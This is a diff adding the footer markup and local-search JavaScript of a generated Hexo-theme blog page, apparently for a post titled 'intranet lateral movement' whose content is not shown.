+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8 + '&url=' + http%3A%2F%2Fexample.com%2Fposts%2Fc1ce75c9%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/posts/c1ce75c9/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
